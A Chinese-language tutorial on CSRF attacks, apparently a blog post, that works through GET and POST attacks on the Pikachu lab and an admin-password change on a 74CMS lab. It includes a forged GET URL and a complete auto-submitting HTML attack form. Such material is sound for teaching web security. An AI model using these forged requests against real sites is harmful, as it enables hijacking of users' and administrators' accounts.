
## 触发条件

触发条件其实是比较严苛的----

1.  用户成功登录页面
2.  修改密码等信息不需要用户二次确认
3.  攻击者要提前明了参数构造格式
    1.  注册同一网站账号
    2.  找到网站内容模板
    3.  参数字典---模糊测试
4.  诱导用户在同一浏览器下既登录攻击目标网站又点击了恶意链接---要让用户心甘情愿不知不觉的点击需要社会工程学与web伪造页面的加持

## 漏洞检测

抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。

Referer字段：根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。

![](https://i-blog.csdnimg.cn/blog_migrate/43c7bb2a1c53d64fa57b13de2ec120b7.png)


## 三、CSRF漏洞的类型

### 3.1. GET型CSRF攻击

发送get请求情况，通常我们在编写代码的时候针对发送get请求的情况比较多，比如点击html的a标签，img标签，或者主动构造参数发送get请求，所有的Get请求参数均会被拼接到url上面，所以可以通过简单的构造url就可以完成攻击。接下来我们将在Pikachu漏洞平台演示CSRF的GET攻击  
步骤一、打开Pikachu，选择get方式的csrf  
第二步、随便登录一个账号: vince/allen/kobe/grady/kevin/lucy/lili,密码均为123456, 比如登录lili， 然后使用burpsuite抓取修改个人信息的数据包, 或者F12打开控制台切换至Network进行抓包  
第三步、我们将抓取到的url的请求参数修改成自己的, 例如将邮箱参数修改成hacker@qq.com, 那么构成的CSRF攻击payload为

```html
http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=chain&email=hacker@qq.com&submit=submit
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5e5558aa175a155e1feab6c0d329a287.png)  
这里面用户的登录唯一标识是PHPSESSID里面的那一串值  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/69fe50ca4753ff53433fed8d7ededf3a.png)  
若用户点击了上述伪造的url, 则会将用户自己的邮箱修改成hacker@qq.com，即完成了一次CSRF的攻击。  
![请添加图片描述](https://i-blog.csdnimg.cn/blog_migrate/52e40d36a93c00b98b94f53356404ce1.gif)  
同理可以将受害者用户的用户名密码进行修改，攻击者就可以登录受害者的账户啦，从这个实例大家可能看到的都是lili这个账户自己将邮箱修改为hacker@qq.com，但是如果CSRF攻击配合XSS攻击，那么首先用户通过XSS攻击获得受害者的cookie/token，就比如上题里面的PHPSESSID，然后再构造新的请求，带上登录认证的cookie信息或token信息，那不就危害加成了嘛。

### 3.2. POST型CSRF攻击

虽然POST请求无法通过伪造URL进行攻击, 但是可以通过伪造恶意网页, 将伪造的POST请求隐藏在恶意网页的表单中, 然后诱引用户点击按钮提交表单, 数据自然就POST至存在CSRF漏洞的网页, 最终用户的信息会被修改

此处运行CSRFTESTER工具来制作恶意网页, 首先浏览器配置网络代理, 监听本机的8008端口,然后在CSRFTESTER点击Start Recording开始抓包  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/071333d26bb23eb5c54a0d8382972d8b.png)  
抓到修改个人信息的数据包后, 在CSRFTESTER删除除了POST请求的其他数据, 将类型修改成POST, 然后点击下面的Generate HTML生成HTML文件  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/42d619a2d5523b128e3ebf7fbc8cd309.png)  
找到生成的HTML文件并对其编辑, 将下面那行修改成, 然后其他POST参数都可自行设置, 这里我将电话号码修改成了999999999

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
<title>OWASP CRSFTester Demonstration</title>
</head>

<body onload="javascript:fireForms()">
<script language="JavaScript">
var pauses = new Array( "30" );

function pausecomp(millis)
{
    var date = new Date();
    var curDate = null;

    do { curDate = new Date(); }
    while(curDate-date < millis);
}

function fireForms()
{
    var count = 1;
    var i=0;
    
    for(i=0; i<count; i++)
    {
        document.forms[i].submit();
        
        pausecomp(pauses[i]);
    }
}
    
</script>
<H2>OWASP CRSFTester Demonstration</H2>
<form method="POST" name="form0" action="http://127.0.0.1:80/pikachu/vul/csrf/csrfpost/csrf_post_edit.php">
<input type="hidden" name="sex" value="girl"/>
<input type="hidden" name="phonenum" value="999999999"/>
<input type="hidden" name="add" value="chain"/>
<input type="hidden" name="email" value="hacker@qq.com"/>
<input type="submit" name="submit" value="submit"/>
</form>

</body>
</html>
```

在浏览器打开生成的恶意网页, 当用户点击submit按钮后, 用户的个人信息就会被修改  
![请添加图片描述](https://i-blog.csdnimg.cn/blog_migrate/6ec096e8b59ca35ca7a1285438400193.gif)


## 漏洞利用实验

利用靶场：骑士 CMS

需要额外搭建一台服务器，放入恶意代码伪装的html

### burp suit实现需改新建管理员密码

![](https://i-blog.csdnimg.cn/blog_migrate/221596a6904d796c5930a28c55aa653d.png)

先声明使用burp suit不是本意，前提是我们需要知道 参数构造格式

![](https://i-blog.csdnimg.cn/blog_migrate/3572f7d123faf2435ffb546afd299113.png)

截获新建管理员的post请求如图用CSRF POC生成html代码，这里需要我们手动把内容粘贴到txt

并对想修改的信息(密码/邮箱)更改然后生成.html 然后将这个.html放入我们新搭建的服务器www

![](https://i-blog.csdnimg.cn/blog_migrate/b51c5f80c7cc371c37f4ba3916c6f875.png)  
![](https://i-blog.csdnimg.cn/blog_migrate/bb58d8045a36a5a6fdb4d788110a2114.png)

![](https://i-blog.csdnimg.cn/blog_migrate/c56074a9cb1aa426007250c3b9ff6ca1.png)

&nbsp;这是burp suit自动生成的网页，需要点击按钮就执行恶意代码

当然前提还是浏览器同时运行成功登录的管理页面(这里为本地路径，应该为服务器存放网页的路径)

&nbsp;点击后就自动跳转为更改成功的页面，但是这里更改的信息就是按照攻击者的请求进行的

### OWASP-CSRFTester实现同样功能

他的实现原理和通过burp suite一样，但是相比较两个最大好处 ：

**不需要拦截数据包**

**生成的恶意连接不需要受害人点击只要打开直接执行**

![](https://i-blog.csdnimg.cn/blog_migrate/b685297566bf48bfbb1dcb2352d084db.png)

![](https://i-blog.csdnimg.cn/blog_migrate/828f941a978611afa06811f5e67c864e.png)

和burp suit一样要设置代理，根据提示让他监听8008端口

![](https://i-blog.csdnimg.cn/blog_migrate/85fa9a65491fa87701a584bccaac56ba.png)

&nbsp;点击右上角的 start recoding 就能监听当前所有的get/post请求，受害者执行新建用户操作是一个post请求，通过右下部分表单来定位到这个请求，然后右下角生成表单存在本地（display in browser要取消勾选要不然生成表单会弹出一个网页）

![](https://i-blog.csdnimg.cn/blog_migrate/7a138266e0ff5036f4de1666ab953bf5.png)

存在本地的是一个html文件 将他记事本打开就能发现密码等重要信息，改就完了

&nbsp;![](https://i-blog.csdnimg.cn/blog_migrate/cdb6e42b3d5c815e480a55c456c12934.png)

点击后没有任何跳转页面，但是再输入原本的用户post请求的账号密码无法登录，说明已经被更改密码
